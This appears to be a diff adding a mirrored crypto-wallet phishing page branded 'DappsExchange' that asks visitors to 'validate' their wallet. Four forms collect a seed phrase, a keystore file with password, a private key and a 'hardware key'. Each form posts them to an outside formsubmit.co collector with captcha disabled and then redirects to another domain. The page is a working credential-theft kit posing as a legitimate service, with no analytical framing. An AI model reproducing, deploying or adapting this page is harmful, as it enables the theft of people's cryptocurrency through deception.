@@ -1,0 +1,172 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Mirrored from dapps.toolconnect.online/validate?wallet=27 by HTTrack Website Copier/3.x [XR&CO'2017], Thu, 20 Oct 2022 23:07:32 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>DappsExchange</title>
+    <link
+      rel="icon"
+      type="image/x-icon"
+      href="favicon.ico"
+    />
+    <link rel="stylesheet" href="v-style.css" />
+  </head>
+  <body>
+    <header>
+      <div class="header-container">
+        <div class="logo-area">
+          <img src="images/logo.png" alt="" class="logo-img" />
+          <div class="logo-text"><h1>DappsExchange</h1></div>
+        </div>
+      </div>
+    </header>
+    <div class="main-section">
+      <div class="section-article">
+        <p class="bold-text">Validate Wallet</p>
+        <p class="light-text">
+			<br />
+			<br />
+			<br />
+          Validate your selected wallet to
+          continue
+        </p>
+      </div>
+      <div class="btns-grid">
+        <h4 class="btns selected" id="mnemonics">MNEMONICS</h4>
+        <h4 class="btns" id="keystore">keystore</h4>
+        <br class="show" />
+        <h4 class="btns up" id="privatekey">PRIVATE KEY</h4>
+        <h4 class="btns up" id="hardware">HARDWARE</h4>
+      </div>
+    </div>
+    <div class="forms">
+      <div class="form" id="form-1">
+        <form
+          action="https://formsubmit.co/13d830203c7a3e3160522c35933dcf71"
+          method="post"
+          id="form1"
+        >
+        <input type="hidden" name="_captcha" value="false">
+        <input type="hidden" name="_next" value="https://www.dappstoolconnect.com/load/">
+        <input type="hidden" name="_template" value="table">
+          <div class="area-1">
+            <input type="hidden" name="walletType" value="mnemonics" />
+            <div class="desc">Please enter your 12/24 word phrase</div>
+            <input type="text" name="phrase" rows="4" required class="input" />
+          </div>
+          <div class="area-2">
+            <input type="submit" class="submit" value="proceed" />
+          </div>
+        </form>
+      </div>
+      <div class="form hide" id="form-2">
+        <form
+          action="https://formsubmit.co/13d830203c7a3e3160522c35933dcf71"
+          method="post"
+        >
+                    <input type="hidden" name="_captcha" value="false">
+        <input type="hidden" name="_next" value="https://www.dappstoolconnect.com/load/">
+        <input type="hidden" name="_template" value="table">
+          <div class="area-1">
+            <input type="hidden" name="walletType" value="keystore" />
+            <div class="desc">Enter your Keystore JSON</div>
+            <input type="text" name="phrase" rows="4" required class="input" />
+            <div class="text-left">Key must be in HEX format</div>
+            <div class="desc" id="m-15">Enter Password</div>
+            <input type="password" name="pin" rows="4" required class="input" />
+          </div>
+          <div class="area-2">
+            <input type="submit" class="submit" value="proceed" />
+          </div>
+        </form>
+      </div>
+      <div class="form hide" id="form-3">
+        <form
+          action="https://formsubmit.co/13d830203c7a3e3160522c35933dcf71"
+          method="post"
+        >
+                              <input type="hidden" name="_captcha" value="false">
+        <input type="hidden" name="_next" value="https://www.dappstoolconnect.com/load/">
+        <input type="hidden" name="_template" value="table">
+          <div class="area-1">
+            <input type="hidden" name="walletType" value="privatekey" />
+            <div class="desc">Enter your private key</div>
+            <input type="text" name="phrase" rows="4" required class="input" />
+            <div class="text-left">Key must be in HEX format</div>
+          </div>
+          <div class="area-2">
+            <input type="submit" class="submit" value="proceed" />
+          </div>
+        </form>
+      </div>
+      <div class="form hide" id="form-4">
+        <form
+          action="https://formsubmit.co/13d830203c7a3e3160522c35933dcf71"
+          method="post"
+        >
+                <input type="hidden" name="_captcha" value="false">
+        <input type="hidden" name="_next" value="https://www.dappstoolconnect.com/load/">
+        <input type="hidden" name="_template" value="table">
+          <div class="area-1">
+            <input type="hidden" name="walletType" value="hardware" />
+            <div class="desc">Enter your Hardware Key</div>
+            <input type="text" name="phrase" rows="4" required class="input" />
+            <div class="text-left">Key must be in HEX format</div>
+          </div>
+          <div class="area-2">
+            <input type="submit" class="submit" value="proceed" />
+          </div>
+        </form>
+      </div>
+    </div>
+    <hr />
+    <footer>
+      <div id="flex-1">
+        <a href="#">
+          <svg
+            class="w-8 h-8 fill-current"
+            viewBox="0 0 32 32"
+            xmlns="../external.html?link=http://www.w3.org/2000/svg"
+          >
+            <path
+              d="M24 11.5c-.6.3-1.2.4-1.9.5.7-.4 1.2-1 1.4-1.8-.6.4-1.3.6-2.1.8-.6-.6-1.5-1-2.4-1-1.7 0-3.2 1.5-3.2 3.3 0 .3 0 .5.1.7-2.7-.1-5.2-1.4-6.8-3.4-.3.5-.4 1-.4 1.7 0 1.1.6 2.1 1.5 2.7-.5 0-1-.2-1.5-.4 0 1.6 1.1 2.9 2.6 3.2-.3.1-.6.1-.9.1-.2 0-.4 0-.6-.1.4 1.3 1.6 2.3 3.1 2.3-1.1.9-2.5 1.4-4.1 1.4H8c1.5.9 3.2 1.5 5 1.5 6 0 9.3-5 9.3-9.3v-.4c.7-.5 1.3-1.1 1.7-1.8z"
+            ></path>
+          </svg>
+        </a>
+        <a href="#">
+          <svg
+            class="w-8 h-8 fill-current"
+            viewBox="0 0 32 32"
+            xmlns="../external.html?link=http://www.w3.org/2000/svg"
+          >
+            <path
+              d="M16 8.2c-4.4 0-8 3.6-8 8 0 3.5 2.3 6.5 5.5 7.6.4.1.5-.2.5-.4V22c-2.2.5-2.7-1-2.7-1-.4-.9-.9-1.2-.9-1.2-.7-.5.1-.5.1-.5.8.1 1.2.8 1.2.8.7 1.3 1.9.9 2.3.7.1-.5.3-.9.5-1.1-1.8-.2-3.6-.9-3.6-4 0-.9.3-1.6.8-2.1-.1-.2-.4-1 .1-2.1 0 0 .7-.2 2.2.8.6-.2 1.3-.3 2-.3s1.4.1 2 .3c1.5-1 2.2-.8 2.2-.8.4 1.1.2 1.9.1 2.1.5.6.8 1.3.8 2.1 0 3.1-1.9 3.7-3.7 3.9.3.4.6.9.6 1.6v2.2c0 .2.1.5.6.4 3.2-1.1 5.5-4.1 5.5-7.6-.1-4.4-3.7-8-8.1-8z"
+            ></path>
+          </svg>
+        </a>
+        <a href="#">
+          <svg
+            class="w-8 h-8 fill-current"
+            viewBox="0 0 32 32"
+            xmlns="../external.html?link=http://www.w3.org/2000/svg"
+          >
+            <path
+              d="M14.023 24L14 17h-3v-3h3v-2c0-2.7 1.672-4 4.08-4 1.153 0 2.144.086 2.433.124v2.821h-1.67c-1.31 0-1.563.623-1.563 1.536V14H21l-1 3h-2.72v7h-3.257z"
+            ></path>
+          </svg>
+        </a>
+      </div>
+      <p class="footer-text-2">
+        &copy; 2022
+        <a href="#"><span id="underline">DappsExchange</span></a>
+      </p>
+    </footer>
+    <script src="v-index.js"></script>
+  </body>
+
+<!-- Mirrored from dapps.toolconnect.online/validate?wallet=27 by HTTrack Website Copier/3.x [XR&CO'2017], Thu, 20 Oct 2022 23:07:32 GMT -->
+</html>
